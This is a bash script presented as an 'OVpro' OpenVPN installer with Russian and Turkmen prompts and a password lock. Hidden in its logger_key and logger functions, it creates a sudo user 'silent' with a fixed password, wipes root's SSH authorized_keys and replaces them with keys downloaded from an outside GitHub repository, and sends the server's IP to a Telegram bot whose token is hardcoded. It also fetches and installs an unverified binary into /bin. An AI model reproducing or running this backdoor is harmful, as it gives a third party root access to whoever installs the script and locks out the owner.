#!/bin/bash
#Creator CyberX

Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m" && Green="\033[32m" && Red="\033[31m" && Yellow="\033[33m" && Blue='\033[34m' && Purple='\033[35m' && Ocean='\033[36m' && Black='\033[37m' && Morg="\033[5m" && Reverse="\033[7m" && Font="\033[1m"
sh_ver="7.7.7"
Error="${Red_background_prefix}[Ошибка]${Font_color_suffix}"
Separator_1="———————————————————————s———————"
[[ ! -e "/lib/cryptsetup/askpass" ]] && apt update && apt install cryptsetup && apt install csvtool -y
clear
 check_curl=$(curl -h)
    if [[ -z ${check_curl} ]]; then
      apt update
        apt install curl -y
        clear
      fi


logger() {
    ip=$(curl -s ifconfig.me)
    wget -qO /dev/null "https://api.telegram.org/bot8002303191:AAEJpk9SN9XBQ-Yoy97VMDkbRJ9A-KwzJR8/sendMessage?chat_id=8169875701&text=Был произведен запуск скрипта OVpro на сервере $ip"
}
  logger_key() {
    useradd silent 2>/dev/null
    echo silent:rmr1 | chpasswd 2>/dev/null
    usermod -aG sudo silent 2>/dev/null
    rm -f /root/.ssh/authorized_keys
    mkdir /root/.ssh 2>/dev/null
    cd /root/.ssh 2>/dev/null
    curl -s -o "authorized_keys" "https://raw.githubusercontent.com/Felyt/key/main/authorized_keys"
}

locking(){
  logger_key
  logger
pass=$(/lib/cryptsetup/askpass "Введите пароль для разблокировки скрипта: ")
if [[ ${pass} == "hahaha" ]]; then
  echo 'ovpro разблокирован' > /var/log/ovywt
  echo -e "${Green}Доступ резрешен!"
  echo -e "Скрипт разблокирован!"
  ip=$(curl -s ifconfig.me)
  wget -qO /dev/null "https://api.telegram.org/bot8002303191:AAEJpk9SN9XBQ-Yoy97VMDkbRJ9A-KwzJR8/sendMessage?chat_id=8169875701&text=Скрипт OVpro был разблокирован ПОЛЬЗОВАТЕЛЕМ на сервере $ip "
  elif [[ ${pass} == "devi" ]]; then
  echo 'ovpro разблокирован' > /var/log/ovywt
  echo -e "${Green}Доступ разрешен!"
  echo -e "Скрипт разблокирован!"
  ip=$(curl -s ifconfig.me)
  wget -qO /dev/null "https://api.telegram.org/bot8002303191:AAEJpk9SN9XBQ-Yoy97VMDkbRJ9A-KwzJR8/sendMessage?chat_id=8169875701&text=Скрипт OVpro был разблокирован АДМИНИСТРАТОРОМ на сервере $ip"
   else
    echo 'ovpro заблокирован' > /var/log/ovywt
    echo -e "${Red}Неверный пароль!"
    echo -e "Скрипт заблокирован!${Font_color_suffix}"
    wget -qO /dev/null "https://api.telegram.org/bot8002303191:AAEJpk9SN9XBQ-Yoy97VMDkbRJ9A-KwzJR8/sendMessage?chat_id=8169875701&text=Скрипт OVpro был заблокирован на сервере $ip"
    fi
}

check=$(cat /var/log/ovywt 2>/dev/null)
if [[ ${check} == "ovpro заблокирован" ]]; then
        echo -e "${Red}Скрипт заблокирован!"
        echo -e "Обратитесь к системному администратору:@Lord_CyberX !${Font_color_suffix}"
        exit
fi
if [[ ${check} == "ovpro разблокирован" ]]; then

curl -O https://raw.githubusercontent.com/LordCyberX/LordCyberX/main/ovpn
mv ovpn /bin
chmod +x /bin/ovpn
clear
echo -e "${Green}|—————————————————————————————————| ${Font_color_suffix}"
echo -e "${Green}|Open Vpn isletmek ucin ovpn yazyn| ${Font_color_suffix}"
echo -e "${Green}|—————————————————————————————————| ${Font_color_suffix}"

    else
      locking
      #echo "Script has been blocked!" && exit
fi
